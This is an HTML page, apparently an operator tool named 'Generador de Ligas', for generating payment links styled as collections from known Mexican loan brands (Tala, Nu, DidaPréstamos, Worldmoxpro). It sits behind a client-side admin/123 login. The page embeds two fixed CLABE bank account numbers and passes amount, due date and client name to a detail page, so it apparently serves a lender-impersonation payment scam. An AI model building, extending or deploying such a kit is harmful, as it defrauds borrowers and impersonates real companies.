<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Generador de Ligas</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0b1120; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        #login-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: url('https://img.freepik.com/foto-gratis/fondo-luces-bokeh-dorado-abstracto_23-2148413465.jpg') no-repeat center center; background-size: cover; filter: brightness(0.5); }
        .login-card { width: 100%; max-width: 400px; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(15px); padding: 3rem 2.5rem; border-radius: 3rem; text-align: center; border: 1px solid rgba(255, 255, 255, 0.3); }
        #main-app { display: none; width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .monto-box { border-radius: 1.5rem; padding: 1rem 1.5rem; margin: 1rem 1.5rem 0 1.5rem; }
        .input-monto { background: transparent; border: none; outline: none; width: 100%; color: white; font-weight: 700; font-size: 2.2rem; }
    </style>
</head>
<body>
    <div id="login-bg"></div>
    <div id="login-screen" class="px-4 w-full flex justify-center">
        <div class="login-card">
            <h2 class="text-3xl font-bold text-slate-800 mb-2">Acceso</h2>
            <div class="space-y-5 mt-8">
                <input type="text" id="user" placeholder="Usuario" class="w-full px-6 py-4 rounded-2xl border border-slate-200 outline-none">
                <input type="password" id="pass" placeholder="Contraseña" class="w-full px-6 py-4 rounded-2xl border border-slate-200 outline-none">
                <button onclick="acceder()" class="w-full bg-blue-600 text-white font-bold py-5 rounded-2xl uppercase tracking-widest text-sm">Entrar</button>
            </div>
        </div>
    </div>

    <div id="main-app">
        <div id="header-bg" class="bg-[#14b8a6] pt-8 pb-4">
            <div class="w-20 h-20 bg-white rounded-3xl mx-auto mb-6 flex items-center justify-center overflow-hidden border-4 border-white/20">
                <img id="app-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
            </div>
            <div class="px-6 mb-2">
                <select id="product-select" onchange="updateApp()" class="w-full bg-white/20 text-white border-none rounded-xl px-4 py-2 text-sm font-bold text-center outline-none">
                    <option value="tala|#14b8a6|#0d9488">Tala Préstamos</option>
                    <option value="nu|#820ad1|#581c87">Préstamos NU</option>
                    <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
                    <option value="worldmox|#0ea5e9|#0369a1">Worldmoxpro Cash</option>
                </select>
            </div>
            <div id="monto-card-bg" class="monto-box bg-[#0d9488] text-white">
                <span class="text-[10px] font-bold opacity-80 uppercase">Monto de Pago</span>
                <div class="flex items-center mt-1">
                    <span class="text-3xl font-bold mr-1">$</span>
                    <input type="number" id="input-monto" placeholder="0.00" class="input-monto">
                </div>
            </div>
        </div>

        <div class="p-8 space-y-4">
            <div class="flex justify-between items-center border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400 uppercase">Vencimiento</span>
                <input type="date" id="f-venc" class="text-sm font-bold text-slate-800 outline-none">
            </div>
            <div class="bg-slate-50 rounded-[2rem] p-5 space-y-4 border border-slate-100">
                <select id="metodo-pago" onchange="cambiarCuenta()" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center outline-none">
                    <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
                    <option value="BBVA">BBVA</option>
                </select>
                <select id="clabe-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center text-blue-600 outline-none">
                    <option value="722969010005687921">722969010005687921</option>
                </select>
            </div>
            <input type="text" id="cliente-nombre" placeholder="Nombre del cliente" class="w-full border-b border-slate-200 py-2 text-sm font-bold outline-none text-center">
            <button onclick="confirmar()" id="btn-main" class="w-full bg-[#0d9488] text-white font-bold py-5 rounded-[1.5rem] uppercase text-xs tracking-widest mt-4">GENERAR LINK</button>
        </div>
    </div>

    <script>
        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];
        function acceder() { if(document.getElementById('user').value === "admin" && document.getElementById('pass').value === "123") { document.getElementById('login-screen').style.display = 'none'; document.getElementById('main-app').style.display = 'block'; } }
        function cambiarCuenta() {
            const m = document.getElementById('metodo-pago').value;
            const c = document.getElementById('clabe-pago');
            c.innerHTML = "";
            let num = (m === "MERCADO PAGO W SPEI") ? "722969010005687921" : "012180015094579916";
            c.add(new Option(num, num));
        }
        function confirmar() {
            const params = new URLSearchParams({
                monto: document.getElementById('input-monto').value || "0.00",
                nombre: document.getElementById('cliente-nombre').value || "Cliente",
                fecha: document.getElementById('f-venc').value,
                prod: document.getElementById('product-select').options[document.getElementById('product-select').selectedIndex].text,
                clabe: document.getElementById('clabe-pago').value,
                banco: document.getElementById('metodo-pago').value,
                start: Date.now() // Captura el momento exacto
            });
            window.location.href = `detalle.html?${params.toString()}`;
        }
        function updateApp() {
            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
            document.getElementById('header-bg').style.backgroundColor = c1;
            document.getElementById('monto-card-bg').style.backgroundColor = c2;
            document.getElementById('btn-main').style.backgroundColor = c2;
        }
    </script>
</body>
</html>
